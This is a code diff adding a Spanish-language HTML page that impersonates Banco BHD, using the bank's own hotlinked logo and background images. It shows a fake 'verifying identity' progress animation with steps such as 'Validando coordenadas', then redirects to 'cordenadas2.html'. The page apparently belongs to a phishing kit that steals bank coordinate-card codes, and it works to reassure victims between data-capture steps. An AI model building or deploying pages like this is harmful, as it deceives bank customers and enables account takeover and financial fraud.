@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+  <title>BHD – Verificando</title>
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    html, body {
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 430px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .bg-bottom {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 38%;
+      background: url('https://ibp.bhd.com.do/assets/img/background-login.webp')
+                  center center / cover no-repeat;
+      z-index: 0;
+    }
+
+    .bg-bottom::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 55%;
+      background: linear-gradient(to bottom, #ffffff 0%, rgba(255,255,255,0) 100%);
+      z-index: 1;
+    }
+
+    .content {
+      position: relative;
+      z-index: 2;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 0 24px;
+    }
+
+    /* ── Logo ── */
+    .logo-wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 40px;
+    }
+
+    .logo-wrap img {
+      height: 90px;
+      width: auto;
+    }
+
+    /* ── Card ── */
+    .card {
+      width: 100%;
+      background: #fff;
+      border: 1.5px solid #e8e8e8;
+      border-radius: 16px;
+      padding: 36px 28px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 22px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.07);
+    }
+
+    /* ── Spinner ── */
+    .spinner-wrap {
+      position: relative;
+      width: 76px;
+      height: 76px;
+    }
+
+    .spinner {
+      width: 76px;
+      height: 76px;
+      border-radius: 50%;
+      border: 5px solid #e8f5e9;
+      border-top-color: #4caf50;
+      animation: spin 0.9s linear infinite;
+    }
+
+    .spinner-icon {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .spinner-icon img {
+      width: 38px;
+      height: 38px;
+      object-fit: contain;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ── Textos ── */
+    .status-title {
+      font-size: 1.08rem;
+      font-weight: 700;
+      color: #222;
+      text-align: center;
+    }
+
+    .status-sub {
+      font-size: 0.81rem;
+      color: #aaa;
+      text-align: center;
+      line-height: 1.55;
+      margin-top: -10px;
+    }
+
+    /* ── Barra de progreso ── */
+    .progress-wrap {
+      width: 100%;
+      background: #f0f0f0;
+      border-radius: 99px;
+      height: 6px;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #4caf50, #81c784);
+      border-radius: 99px;
+      transition: width 0.6s ease;
+    }
+
+    /* ── Steps ── */
+    .steps {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 0.84rem;
+      color: #ccc;
+      transition: color .4s;
+    }
+
+    .step.active { color: #222; font-weight: 600; }
+    .step.done   { color: #4caf50; }
+
+    .step-icon {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      border: 2px solid #e0e0e0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-size: 0.72rem;
+      font-weight: 700;
+      transition: all .4s;
+      color: #ccc;
+    }
+
+    .step.active .step-icon {
+      border-color: #4caf50;
+      color: #4caf50;
+    }
+
+    .step.done .step-icon {
+      background: #4caf50;
+      border-color: #4caf50;
+      color: #fff;
+    }
+
+    .spacer { flex: 1; max-height: 60px; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="bg-bottom"></div>
+
+  <div class="content">
+
+    <div class="logo-wrap">
+      <img src="https://ibp.bhd.com.do/assets/img/logo-bhd.svg" alt="BHD Logo" />
+    </div>
+
+    <div class="card">
+
+      <div class="spinner-wrap">
+        <div class="spinner"></div>
+        <div class="spinner-icon">
+          <img src="https://ibp.bhd.com.do/assets/img/logo-bhd.svg" alt="BHD" />
+        </div>
+      </div>
+
+      <div class="status-title" id="statusTitle">Verificando identidad...</div>
+      <div class="status-sub"   id="statusSub">Por favor espera mientras validamos tu información de forma segura.</div>
+
+      <div class="progress-wrap">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+
+      <div class="steps">
+        <div class="step active" id="step1">
+          <div class="step-icon" id="icon1">1</div>
+          <span>Validando coordenadas</span>
+        </div>
+        <div class="step" id="step2">
+          <div class="step-icon" id="icon2">2</div>
+          <span>Verificando identidad</span>
+        </div>
+        <div class="step" id="step3">
+          <div class="step-icon" id="icon3">3</div>
+          <span>Cargando tu cuenta</span>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="spacer"></div>
+  </div>
+</div>
+
+<script>
+  const bar   = document.getElementById('progressBar');
+  const title = document.getElementById('statusTitle');
+  const sub   = document.getElementById('statusSub');
+
+  // ── Configuración de los 3 pasos en 10 segundos ──
+  // Paso 1: 0s → 3.3s
+  // Paso 2: 3.3s → 6.6s
+  // Paso 3: 6.6s → 9s
+  // Fin + redirect: 10s
+
+  function setStep(stepNum) {
+    const steps = [
+      {
+        id: 'step1', pct: 33,
+        title: 'Validando coordenadas...',
+        sub: 'Comprobando tu documento de identidad.'
+      },
+      {
+        id: 'step2', pct: 66,
+        title: 'Verificando identidad...',
+        sub: 'Autenticando tu perfil de forma segura.'
+      },
+      {
+        id: 'step3', pct: 90,
+        title: 'Cargando tu cuenta...',
+        sub: 'Preparando tu panel. Ya casi está listo.'
+      }
+    ];
+
+    // Marcar anteriores como done
+    for (let i = 0; i < stepNum - 1; i++) {
+      const el   = document.getElementById(steps[i].id);
+      const icon = document.getElementById('icon' + (i + 1));
+      el.classList.remove('active');
+      el.classList.add('done');
+      icon.textContent = '✓';
+    }
+
+    // Activar actual
+    const cur  = steps[stepNum - 1];
+    const el   = document.getElementById(cur.id);
+    el.classList.add('active');
+    bar.style.width  = cur.pct + '%';
+    title.textContent = cur.title;
+    sub.textContent   = cur.sub;
+  }
+
+  function finish() {
+    // Marcar todos como done
+    for (let i = 1; i <= 3; i++) {
+      const el   = document.getElementById('step' + i);
+      const icon = document.getElementById('icon' + i);
+      el.classList.remove('active');
+      el.classList.add('done');
+      icon.textContent = '✓';
+    }
+    bar.style.width   = '100%';
+    title.textContent = '¡Todo listo!';
+    sub.textContent   = 'Redirigiendo a tu cuenta...';
+
+    // ⚠️ Cambia esta URL a donde quieras redirigir
+    setTimeout(() => {
+      window.location.href = 'cordenadas2.html';
+    }, 1000);
+  }
+
+  // ── Timeline de 10 segundos ──
+  setStep(1);                            // 0s   — Paso 1
+  setTimeout(() => setStep(2), 3300);    // 3.3s — Paso 2
+  setTimeout(() => setStep(3), 6600);    // 6.6s — Paso 3
+  setTimeout(() => finish(),   9000);    // 9s   — Termina
+  // 9s + 1s del setTimeout interno = 10s total antes de redirigir
+</script>
+
+</body>
+</html>
